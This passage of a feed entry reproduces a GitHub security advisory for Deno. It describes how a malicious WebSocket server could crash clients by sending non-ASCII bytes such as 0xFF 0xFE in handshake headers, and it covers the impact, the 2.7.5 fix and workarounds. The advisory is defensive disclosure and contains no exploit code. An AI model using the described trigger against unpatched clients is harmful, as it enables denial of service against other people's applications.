a way that assumed their bytes were always printable ASCII. A response header
containing non-visible-ASCII bytes (<code>0x80</code>-<code>0xFF</code>) caused a panic that aborted
the entire Deno process.</p>
<h2 id="details">Details</h2>
<p>When establishing a client WebSocket connection, Deno read the
<code>Sec-WebSocket-Protocol</code> and <code>Sec-WebSocket-Extensions</code> headers from the
server's <code>101 Switching Protocols</code> response and converted them to strings
without handling the failure case. <code>HeaderValue::to_str()</code> returns an error for
any value containing bytes outside the visible-ASCII range, so a header carrying
such bytes triggered an unrecoverable error during conversion.</p>
<p>Because the client initiates the outbound connection, the handshake response is
fully controlled by the server. A server that returns bytes such as <code>0xFF 0xFE</code>
in either header could therefore crash any client that connected to it.</p>
<p>This is purely an availability issue. There is no information disclosure and no
memory-safety impact; the only effect is termination of the current process.</p>
<h2 id="impact">Impact</h2>
<p>Remote denial of service. Any Deno application that establishes WebSocket
connections to untrusted or potentially-compromised endpoints could be
terminated by the remote peer. Exploitation requires the victim application to
initiate the outbound WebSocket connection. An attacker who controls the
WebSocket endpoint, or who can man-in-the-middle a plaintext <code>ws://</code> connection,
could trigger the crash. The effect is confined to crashing the process that
opened the connection.</p>
<h2 id="patch">Patch</h2>
<p>The issue is fixed in Deno <code>2.7.5</code>. The header values are now parsed with
graceful fallbacks: values that cannot be represented as ASCII strings are
skipped instead of aborting the process. A regression test covers a server that
returns non-ASCII bytes in <code>Sec-WebSocket-Protocol</code>.</p>
<p>Users should upgrade to Deno <code>2.7.5</code> or later.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Until you can upgrade, only connect to trusted WebSocket endpoints and prefer
<code>wss://</code> (TLS) over <code>ws://</code>, which prevents a network man-in-the-middle from
injecting malicious header bytes into the handshake response.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-x2qc-cmh9-f4hf">https://github.com/denoland/deno/security/advisories/GHSA-x2qc-cmh9-f4hf</a></li>
<li><a href="https://github.com/advisories/GHSA-x2qc-cmh9-f4hf">https://github.com/advisories/GHSA-x2qc-cmh9-f4hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2qc-cmh9-f4hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-17T18:48:18.000Z</published>
    </entry>
</feed>